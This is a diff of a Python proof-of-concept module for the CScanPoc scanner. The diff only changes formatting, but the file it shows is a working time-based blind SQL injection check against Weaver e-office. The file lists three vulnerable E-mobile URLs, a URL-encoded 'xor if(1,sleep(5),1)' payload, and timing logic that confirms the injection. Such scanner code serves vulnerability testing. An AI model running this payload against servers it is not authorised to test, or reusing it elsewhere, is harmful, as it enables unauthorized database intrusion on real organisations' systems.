@@ -4,11 +4,12 @@ from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import time
 
+
 class Vuln(ABVuln):
-    vuln_id = 'weaver_0051' # 平台漏洞编号，留空
+    vuln_id = 'weaver_0051'  # 平台漏洞编号，留空
     name = '泛微e-office SQL注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2015-07-22'  # 漏洞公布时间
     desc = '''
         泛微 e-office 存在多处 bool盲注漏洞：
@@ -22,6 +23,7 @@ class Vuln(ABVuln):
     product = '泛微OA'  # 漏洞应用名称
     product_version = '泛微e-office'  # 漏洞应用版本
 
+
 class Poc(ABPoc):
     poc_id = '7f5cbab4-7398-429d-8add-75d8c1fd7a73'
     author = '47bwy'  # POC编写者
@@ -34,11 +36,11 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #Refer: http://www.wooyun.org/bugs/wooyun-2015-0104782
+
+            # Refer: http://www.wooyun.org/bugs/wooyun-2015-0104782
             hh = hackhttp.hackhttp()
             arg = self.target
-            vun_urls=[
+            vun_urls = [
                 '/E-mobile/source_page.php?pagediff=email&emailid=1',
                 '/E-mobile/emailreply_page.php?detailid=1',
                 '/E-mobile/email_page.php?detailid=1'
@@ -47,12 +49,14 @@ class Poc(ABPoc):
             flase = "%20xor%201%3Dif%281%2Csleep%285%29%2C1%29%20limit%201"
             for vun_url in vun_urls:
                 start_ture = time.time()
-                code0, head, res, errcode, finalurl = hh.http(arg + vun_url + ture)
+                code0, head, res, errcode, finalurl = hh.http(
+                    arg + vun_url + ture)
                 end_ture = time.time()
                 ture_time = end_ture - start_ture
                 start_flase = time.time()
 
-                code5, head, res, errcode, finalurl = hh.http(arg + vun_url + flase)
+                code5, head, res, errcode, finalurl = hh.http(
+                    arg + vun_url + flase)
                 end_flase = time.time()
                 flase_time = end_flase - start_flase
                 if code0 == 200 and code5 == 200 and flase_time > 5 and 2 > ture_time:
@@ -65,6 +69,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
